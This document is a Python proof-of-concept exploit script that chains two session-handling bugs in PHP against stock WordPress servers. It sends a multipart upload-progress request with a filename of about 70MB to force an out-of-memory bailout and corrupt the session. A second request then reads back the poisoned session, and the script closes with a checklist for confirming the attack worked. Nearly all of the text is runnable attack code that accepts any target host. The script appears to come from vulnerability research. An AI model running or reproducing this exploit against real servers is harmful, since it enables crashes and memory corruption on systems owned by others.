#!/usr/bin/env python3
"""poc_wp_stock.py - CVE-2026-109618/619 chain against STOCK WordPress 6.x
(php 8.2.34 pre-patch, x86_64, stock php.ini: memory_limit=128M,
session.upload_progress=On) - zero app cooperation.

Same chain as lanes/race-618/glm/poc.py (2M-lab variant), scaled for the
stock 128M limit per the scorecard P10 note ("stock-128M trigger,
64-100MB field"): producer = multipart PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
+ file part with a ~70MB filename -> first FILE_START progress update OOMs
inside php_session_encode (smart_str) -> zend_bailout leaves BG(serialize)
stale; shutdown flushes the corrupt session through it (618->619); reader
on the same SID consumes the corrupt tokens pre-RINIT.

Usage: poc_wp_stock.py [host] [port] [filename_mb]
"""
import re
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8099
FNAME_MB = float(sys.argv[3]) if len(sys.argv) > 3 else 70
B = b"GLM618WP"
SID = time.strftime("%Y%m%d%H%M%S", time.gmtime()).encode() + b"cafef00d"
SID = SID.ljust(32, b"0")[:32]


def part(name, body, filename=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"


def pb(parts):
    return b"".join(parts) + b"--" + B + b"--\r\n"


def post_head(blen):
    return (f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\nConnection: keep-alive\r\n\r\n").encode()


class KA:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=30)

    def send(self, head, body=None, timeout=90):
        t0 = time.time()
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)):
                    return buf, time.time() - t0
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                return buf + b"\n<TIMEOUT>", time.time() - t0
            except ConnectionResetError:
                return buf + b"\n<RESET>", time.time() - t0
            if not d:
                return buf + b"\n<EOF>", time.time() - t0
            buf += d

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

print(f"target: http://{HOST}:{PORT}/  (stock WP, sid={SID.decode()}, "
      f"filename={FNAME_MB}MB)")
# baseline: stock WP answers
ka = KA()
r, dt = ka.send(f"GET / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
                f"Connection: keep-alive\r\n\r\n".encode(), timeout=15)
line = r.split(b"\r\n")[0].decode(errors="replace")
print(f"[0] baseline GET: {line} t={dt:.1f}s")

# ---- stage 1: producer - OOM inside the progress encode (618) ----
prod = pb([part(b"PHPSESSID", SID),
           part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
           part(b"u", b"x" * 100, filename=b"A" * int(FNAME_MB * 1024 * 1024))])
r, dt = ka.send(post_head(len(prod)), prod, timeout=120)
body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
print(f"[1] producer ({FNAME_MB}MB filename, 618 OOM expected): t={dt:.1f}s")
print("    " + body[:300].decode(errors="replace").replace("\n", " "))

# ---- stage 2: corrupt session persisted by the aborted request's
#      shutdown flush through stale BG(serialize) (in-lane observability
#      needs container access; here we infer via the reader below) ----

# ---- stage 3: reader consumes the corrupt session pre-RINIT (619) ----
cons = pb([part(b"PHPSESSID", SID),
           part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
           part(b"u", b"y", filename=b"b.txt")])
r, dt = ka.send(post_head(len(cons)), cons, timeout=75)
body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
print(f"[3] reader on poisoned sid: t={dt:.1f}s rawlen={len(r)}")
print("    " + body[:300].decode(errors="replace").replace("\n", " "))
ka.close()
print("""
Signature check (stock 128M): producer fatal must read
  "Allowed memory size of 134217728 bytes exhausted (tried to allocate
   ~7XMB bytes) in Unknown on line 0"
Reader shows either a decode-side bogus-length fatal or divergence hang
=> 618->619 chain live on STOCK WordPress, zero app code involved.
""")
